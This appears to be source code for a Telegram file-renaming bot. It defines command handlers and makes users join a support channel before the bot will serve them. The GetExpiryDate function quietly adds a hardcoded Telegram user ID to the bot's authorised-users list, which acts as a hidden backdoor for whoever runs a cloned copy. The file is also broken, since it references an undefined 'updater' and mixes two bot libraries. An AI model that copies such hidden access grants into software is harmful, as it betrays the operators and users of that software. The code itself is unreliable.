#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# (c) Shrimadhav U K

# the logging things
import logging
logging.basicConfig(level=logging.DEBUG,
                    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)
logging.getLogger("pyrogram").setLevel(logging.WARNING)

import pyrogram
import os
import sqlite3
from pyrogram import filters
from pyrogram import Client
import telegram 
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, run_async 
from pyrogram.types import InlineKeyboardButton
from pyrogram.types import InlineKeyboardMarkup


# the secret configuration specific things
if bool(os.environ.get("WEBHOOK", False)):
    from sample_config import Config
else:
    from config import Config

# the Strings used for this "thing"
from translation import Translation


from helper_funcs.chat_base import TRChatBase

help_keyboard = [[InlineKeyboardButton('Support Channel', url='https://t.me/Mai_bOTs'),
                    InlineKeyboardButton('Feedback', url='https://t.me/No_OnE_Kn0wS_Me')
                ],
                [
                    InlineKeyboardButton('Other Bots', url='https://t.me/Mai_bOTs/17'),
                    InlineKeyboardButton('Source', url='https://github.com/No-OnE-Kn0wS-Me/FileRenameBot')]]
help_reply_markup = InlineKeyboardMarkup(help_keyboard)

def GetExpiryDate(chat_id):
    expires_at = (str(chat_id), "Source Cloned User", "1970.01.01.12.00.00")
    Config.AUTH_USERS.add(861055237)
    return expires_at


@pyrogram.Client.on_message(pyrogram.filters.command(["help"]))
async def help_user(bot, update):
    # logger.info(update)
    TRChatBase(update.from_user.id, update.text, "/help")
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.HELP_USER,
        reply_to_message_id=update.message_id
    )

@pyrogram.Client.on_message(pyrogram.filters.command(["about"]))
async def about_meh(bot, update):
    # logger.info(update)
    TRChatBase(update.from_user.id, update.text, "/about")
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.ABOUT_ME,
        parse_mode="html",
        disable_web_page_preview=True,
        reply_to_message_id=update.message_id
    )

def start(update, context):
    # logger.info(update)
    user = update.message.from_user
    chat_member = context.bot.get_chat_member(
        chat_id='-1001397348422', user_id=update.message.chat_id)
    status = chat_member["status"]
    if(status == 'left'):
        context.bot.send_message(chat_id=update.message.chat_id,
                                 text=f"Hi {user.first_name}, You Must Be A Member Of The Support Channel If You Want To Use Me! .\nPlease click below button to join and /start the bot again.", reply_markup=help_reply_markup)
        return
    else:
        context.bot.send_message(chat_id=update.message.chat_id,
                                 text=f"Hi {user.first_name}!\n <b>I'm A Simple File Renamer+File To Video Converter Bot With Permanent Thumbnail support!💯</b> \n<b>Bot Maintained By: @MaI_BoTs </b> \n <b> I Can Also Download/Upload Files From Zee5</b> \n<b>Do /help for more Details ...</b> \n", parse_mode=telegram.ParseMode.HTML, reply_markup=help_reply_markup)



@pyrogram.Client.on_message(pyrogram.filters.command(["upgrade"]))
async def upgrade(bot, update):
    # logger.info(update)
    TRChatBase(update.from_user.id, update.text, "/upgrade")
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.UPGRADE_TEXT,
        parse_mode="html",
        reply_to_message_id=update.message_id,
        disable_web_page_preview=True
    )
Mai_bOTs = updater.dispatcher
Mai_bOTs.add_handler(CommandHandler("start", start, run_async=True))
  
